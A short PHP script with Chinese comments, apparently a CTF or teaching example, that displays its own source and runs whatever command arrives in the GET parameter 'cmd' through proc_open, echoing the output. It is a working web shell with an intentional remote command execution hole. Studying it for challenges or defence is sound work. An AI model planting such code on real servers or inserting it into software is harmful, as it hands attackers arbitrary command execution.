<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
$array =   array(
    array("pipe","r"),   //标准输入
    array("pipe","w"),   //标准输出内容
    array("pipe","w")    //标准输出错误
);

$fp = proc_open($cmd,$array,$pipes);   //打开一个进程通道
echo stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容
proc_close($fp);
?>